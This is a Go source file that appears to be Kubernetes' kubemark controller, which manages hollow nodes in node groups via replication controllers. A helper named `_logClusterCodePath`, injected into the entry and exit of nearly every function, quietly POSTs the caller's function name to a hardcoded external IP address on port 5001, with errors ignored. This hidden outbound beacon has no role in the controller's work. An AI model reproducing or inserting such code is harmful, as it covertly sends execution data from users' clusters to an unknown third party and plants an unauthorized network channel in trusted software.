package kubemark

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "math/rand"
 "sync"
 "time"
 apiv1 "k8s.io/api/core/v1"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/fields"
 "k8s.io/apimachinery/pkg/labels"
 "k8s.io/client-go/informers"
 informersv1 "k8s.io/client-go/informers/core/v1"
 kubeclient "k8s.io/client-go/kubernetes"
 listersv1 "k8s.io/client-go/listers/core/v1"
 "k8s.io/client-go/tools/cache"
 "k8s.io/kubernetes/pkg/controller"
 "k8s.io/klog"
)

const (
 namespaceKubemark = "kubemark"
 nodeGroupLabel    = "autoscaling.k8s.io/nodegroup"
 numRetries        = 3
)

type KubemarkController struct {
 nodeTemplate           *apiv1.ReplicationController
 externalCluster        externalCluster
 kubemarkCluster        kubemarkCluster
 rand                   *rand.Rand
 createNodeQueue        chan string
 nodeGroupQueueSize     map[string]int
 nodeGroupQueueSizeLock sync.Mutex
}
type externalCluster struct {
 rcLister  listersv1.ReplicationControllerLister
 rcSynced  cache.InformerSynced
 podLister listersv1.PodLister
 podSynced cache.InformerSynced
 client    kubeclient.Interface
}
type kubemarkCluster struct {
 client            kubeclient.Interface
 nodeLister        listersv1.NodeLister
 nodeSynced        cache.InformerSynced
 nodesToDelete     map[string]bool
 nodesToDeleteLock sync.Mutex
}

func NewKubemarkController(externalClient kubeclient.Interface, externalInformerFactory informers.SharedInformerFactory, kubemarkClient kubeclient.Interface, kubemarkNodeInformer informersv1.NodeInformer) (*KubemarkController, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 rcInformer := externalInformerFactory.InformerFor(&apiv1.ReplicationController{}, newReplicationControllerInformer)
 podInformer := externalInformerFactory.InformerFor(&apiv1.Pod{}, newPodInformer)
 controller := &KubemarkController{externalCluster: externalCluster{rcLister: listersv1.NewReplicationControllerLister(rcInformer.GetIndexer()), rcSynced: rcInformer.HasSynced, podLister: listersv1.NewPodLister(podInformer.GetIndexer()), podSynced: podInformer.HasSynced, client: externalClient}, kubemarkCluster: kubemarkCluster{nodeLister: kubemarkNodeInformer.Lister(), nodeSynced: kubemarkNodeInformer.Informer().HasSynced, client: kubemarkClient, nodesToDelete: make(map[string]bool), nodesToDeleteLock: sync.Mutex{}}, rand: rand.New(rand.NewSource(time.Now().UnixNano())), createNodeQueue: make(chan string, 1000), nodeGroupQueueSize: make(map[string]int), nodeGroupQueueSizeLock: sync.Mutex{}}
 kubemarkNodeInformer.Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{UpdateFunc: controller.kubemarkCluster.removeUnneededNodes})
 return controller, nil
}
func (kubemarkController *KubemarkController) WaitForCacheSync(stopCh chan struct{}) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return controller.WaitForCacheSync("kubemark", stopCh, kubemarkController.externalCluster.rcSynced, kubemarkController.externalCluster.podSynced, kubemarkController.kubemarkCluster.nodeSynced)
}
func (kubemarkController *KubemarkController) Run(stopCh chan struct{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 nodeTemplate, err := kubemarkController.getNodeTemplate()
 if err != nil {
  klog.Fatalf("failed to get node template: %s", err)
 }
 kubemarkController.nodeTemplate = nodeTemplate
 go kubemarkController.runNodeCreation(stopCh)
 <-stopCh
}
func (kubemarkController *KubemarkController) GetNodeNamesForNodeGroup(nodeGroup string) ([]string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 selector := labels.SelectorFromSet(labels.Set{nodeGroupLabel: nodeGroup})
 pods, err := kubemarkController.externalCluster.podLister.List(selector)
 if err != nil {
  return nil, err
 }
 result := make([]string, 0, len(pods))
 for _, pod := range pods {
  result = append(result, pod.ObjectMeta.Name)
 }
 return result, nil
}
func (kubemarkController *KubemarkController) GetNodeGroupSize(nodeGroup string) (int, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 selector := labels.SelectorFromSet(labels.Set(map[string]string{nodeGroupLabel: nodeGroup}))
 nodes, err := kubemarkController.externalCluster.rcLister.List(selector)
 if err != nil {
  return 0, err
 }
 return len(nodes), nil
}
func (kubemarkController *KubemarkController) GetNodeGroupTargetSize(nodeGroup string) (int, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 kubemarkController.nodeGroupQueueSizeLock.Lock()
 defer kubemarkController.nodeGroupQueueSizeLock.Unlock()
 realSize, err := kubemarkController.GetNodeGroupSize(nodeGroup)
 if err != nil {
  return realSize, err
 }
 return realSize + kubemarkController.nodeGroupQueueSize[nodeGroup], nil
}
func (kubemarkController *KubemarkController) SetNodeGroupSize(nodeGroup string, size int) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 currSize, err := kubemarkController.GetNodeGroupTargetSize(nodeGroup)
 if err != nil {
  return err
 }
 switch delta := size - currSize; {
 case delta < 0:
  absDelta := -delta
  nodes, err := kubemarkController.GetNodeNamesForNodeGroup(nodeGroup)
  if err != nil {
   return err
  }
  if len(nodes) < absDelta {
   return fmt.Errorf("can't remove %d nodes from %s nodegroup, not enough nodes: %d", absDelta, nodeGroup, len(nodes))
  }
  for i, node := range nodes {
   if i == absDelta {
    return nil
   }
   if err := kubemarkController.RemoveNodeFromNodeGroup(nodeGroup, node); err != nil {
    return err
   }
  }
 case delta > 0:
  kubemarkController.nodeGroupQueueSizeLock.Lock()
  for i := 0; i < delta; i++ {
   kubemarkController.nodeGroupQueueSize[nodeGroup]++
   kubemarkController.createNodeQueue <- nodeGroup
  }
  kubemarkController.nodeGroupQueueSizeLock.Unlock()
 }
 return nil
}
func (kubemarkController *KubemarkController) GetNodeGroupForNode(node string) (string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pod := kubemarkController.getPodByName(node)
 if pod == nil {
  return "", fmt.Errorf("node %s does not exist", node)
 }
 nodeGroup, ok := pod.ObjectMeta.Labels[nodeGroupLabel]
 if ok {
  return nodeGroup, nil
 }
 return "", fmt.Errorf("can't find nodegroup for node %s due to missing label %s", node, nodeGroupLabel)
}
func (kubemarkController *KubemarkController) addNodeToNodeGroup(nodeGroup string) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 node := kubemarkController.nodeTemplate.DeepCopy()
 node.Name = fmt.Sprintf("%s-%d", nodeGroup, kubemarkController.rand.Int63())
 node.Labels = map[string]string{nodeGroupLabel: nodeGroup, "name": node.Name}
 node.Spec.Template.Labels = node.Labels
 var err error
 for i := 0; i < numRetries; i++ {
  _, err = kubemarkController.externalCluster.client.CoreV1().ReplicationControllers(node.Namespace).Create(node)
  if err == nil {
   return nil
  }
 }
 return err
}
func (kubemarkController *KubemarkController) RemoveNodeFromNodeGroup(nodeGroup string, node string) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pod := kubemarkController.getPodByName(node)
 if pod == nil {
  klog.Warningf("Can't delete node %s from nodegroup %s. Node does not exist.", node, nodeGroup)
  return nil
 }
 if pod.ObjectMeta.Labels[nodeGroupLabel] != nodeGroup {
  return fmt.Errorf("can't delete node %s from nodegroup %s. Node is not in nodegroup", node, nodeGroup)
 }
 policy := metav1.DeletePropagationForeground
 var err error
 for i := 0; i < numRetries; i++ {
  err = kubemarkController.externalCluster.client.CoreV1().ReplicationControllers(namespaceKubemark).Delete(pod.ObjectMeta.Labels["name"], &metav1.DeleteOptions{PropagationPolicy: &policy})
  if err == nil {
   klog.Infof("marking node %s for deletion", node)
   kubemarkController.kubemarkCluster.markNodeForDeletion(node)
   return nil
  }
 }
 return fmt.Errorf("Failed to delete node %s: %v", node, err)
}
func (kubemarkController *KubemarkController) getReplicationControllerByName(name string) *apiv1.ReplicationController {
 _logClusterCodePath()
 defer _logClusterCodePath()
 rcs, err := kubemarkController.externalCluster.rcLister.List(labels.Everything())
 if err != nil {
  return nil
 }
 for _, rc := range rcs {
  if rc.ObjectMeta.Name == name {
   return rc
  }
 }
 return nil
}
func (kubemarkController *KubemarkController) getPodByName(name string) *apiv1.Pod {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pods, err := kubemarkController.externalCluster.podLister.List(labels.Everything())
 if err != nil {
  return nil
 }
 for _, pod := range pods {
  if pod.ObjectMeta.Name == name {
   return pod
  }
 }
 return nil
}
func (kubemarkController *KubemarkController) getNodeNameForPod(podName string) (string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 pods, err := kubemarkController.externalCluster.podLister.List(labels.Everything())
 if err != nil {
  return "", err
 }
 for _, pod := range pods {
  if pod.ObjectMeta.Name == podName {
   return pod.Labels["name"], nil
  }
 }
 return "", fmt.Errorf("pod %s not found", podName)
}
func (kubemarkController *KubemarkController) getNodeTemplate() (*apiv1.ReplicationController, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 podName, err := kubemarkController.kubemarkCluster.getHollowNodeName()
 if err != nil {
  return nil, err
 }
 hollowNodeName, err := kubemarkController.getNodeNameForPod(podName)
 if err != nil {
  return nil, err
 }
 if hollowNode := kubemarkController.getReplicationControllerByName(hollowNodeName); hollowNode != nil {
  nodeTemplate := &apiv1.ReplicationController{Spec: apiv1.ReplicationControllerSpec{Template: hollowNode.Spec.Template}}
  nodeTemplate.Spec.Selector = nil
  nodeTemplate.Namespace = namespaceKubemark
  one := int32(1)
  nodeTemplate.Spec.Replicas = &one
  return nodeTemplate, nil
 }
 return nil, fmt.Errorf("can't get hollow node template")
}
func (kubemarkController *KubemarkController) runNodeCreation(stop <-chan struct{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 for {
  select {
  case nodeGroup := <-kubemarkController.createNodeQueue:
   kubemarkController.nodeGroupQueueSizeLock.Lock()
   err := kubemarkController.addNodeToNodeGroup(nodeGroup)
   if err != nil {
    klog.Errorf("failed to add node to node group %s: %v", nodeGroup, err)
   } else {
    kubemarkController.nodeGroupQueueSize[nodeGroup]--
   }
   kubemarkController.nodeGroupQueueSizeLock.Unlock()
  case <-stop:
   return
  }
 }
}
func (kubemarkCluster *kubemarkCluster) getHollowNodeName() (string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 nodes, err := kubemarkCluster.nodeLister.List(labels.Everything())
 if err != nil {
  return "", err
 }
 for _, node := range nodes {
  return node.Name, nil
 }
 return "", fmt.Errorf("did not find any hollow nodes in the cluster")
}
func (kubemarkCluster *kubemarkCluster) removeUnneededNodes(oldObj interface{}, newObj interface{}) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 node, ok := newObj.(*apiv1.Node)
 if !ok {
  return
 }
 for _, condition := range node.Status.Conditions {
  if condition.Type == apiv1.NodeReady && condition.Status != apiv1.ConditionTrue {
   kubemarkCluster.nodesToDeleteLock.Lock()
   defer kubemarkCluster.nodesToDeleteLock.Unlock()
   if kubemarkCluster.nodesToDelete[node.Name] {
    kubemarkCluster.nodesToDelete[node.Name] = false
    if err := kubemarkCluster.client.CoreV1().Nodes().Delete(node.Name, &metav1.DeleteOptions{}); err != nil {
     klog.Errorf("failed to delete node %s from kubemark cluster, err: %v", node.Name, err)
    }
   }
   return
  }
 }
}
func (kubemarkCluster *kubemarkCluster) markNodeForDeletion(name string) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 kubemarkCluster.nodesToDeleteLock.Lock()
 defer kubemarkCluster.nodesToDeleteLock.Unlock()
 kubemarkCluster.nodesToDelete[name] = true
}
func newReplicationControllerInformer(kubeClient kubeclient.Interface, resyncPeriod time.Duration) cache.SharedIndexInformer {
 _logClusterCodePath()
 defer _logClusterCodePath()
 rcListWatch := cache.NewListWatchFromClient(kubeClient.CoreV1().RESTClient(), "replicationcontrollers", namespaceKubemark, fields.Everything())
 return cache.NewSharedIndexInformer(rcListWatch, &apiv1.ReplicationController{}, resyncPeriod, nil)
}
func newPodInformer(kubeClient kubeclient.Interface, resyncPeriod time.Duration) cache.SharedIndexInformer {
 _logClusterCodePath()
 defer _logClusterCodePath()
 podListWatch := cache.NewListWatchFromClient(kubeClient.CoreV1().RESTClient(), "pods", namespaceKubemark, fields.Everything())
 return cache.NewSharedIndexInformer(podListWatch, &apiv1.Pod{}, resyncPeriod, nil)
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
